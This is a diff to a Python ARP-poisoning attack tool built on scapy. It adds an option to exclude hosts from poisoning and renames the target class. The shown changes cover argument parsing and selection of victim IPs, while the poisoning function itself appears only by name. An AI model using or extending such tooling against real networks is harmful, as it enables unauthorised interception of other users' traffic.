@@ -11,13 +11,14 @@ parser = argparse.ArgumentParser(description='ARP Poisoning Tool')
 parser.add_argument('-i', '--interface', help='Interface to send packets through', required=True)
 parser.add_argument('-t', '--targets', help='IP address of target hosts', required=True)
 parser.add_argument('-g', '--gateway', help='IP address of gateway', required=True)
+parser.add_argument('-e', '--exclude', help='IP address of hosts to exclude from poisoning', required=False)
 args = parser.parse_args()
 
 interface = args.interface
 conf.iface = interface
 conf.verb = 0
 
-class Target:
+class Host:
     def __init__(self, ip):
         self.ip = ip
         self.is_alive = False
@@ -35,12 +36,12 @@ def ip_translator(ip):
         ip = ip.split("-")
         ips = []
         for i in range(int(ip[0].split(".")[-1]), int(ip[1].split(".")[-1]) + 1):
-            ips.append(Target(".".join(ip[0].split(".")[:-1]) + "." + str(i)))
+            ips.append(Host(".".join(ip[0].split(".")[:-1]) + "." + str(i)))
         return ips
     elif "/" in ip:
         # Ip is a subnet
         _ips = ipaddress.ip_network(ip)
-        ips = [Target(str(ip)) for ip in _ips]
+        ips = [Host(str(ip)) for ip in _ips]
         # remove broadcast ip
         ips.pop()
         # remove network ip
@@ -48,7 +49,7 @@ def ip_translator(ip):
         return ips
     else:
         # Ip is a single ip (hopefully not a broadcast or network ip)
-        return [Target(ip)]
+        return [Host(ip)]
 
 def check_if_alive(ips):
     '''
@@ -119,6 +120,11 @@ def poison_target(gateway_ip, gateway_mac, targets):
 attacker_mac = get_mac_address_of_interface(interface)
 
 targets = ip_translator(args.targets)
+excludes = ip_translator(args.exclude) if args.exclude else []
+_exclude_ips = [item.ip for item in excludes]
+targets = [item for item in targets if item.ip not in _exclude_ips]
+del _exclude_ips
+
 check_if_alive(targets)
 gateway_ip = args.gateway
 
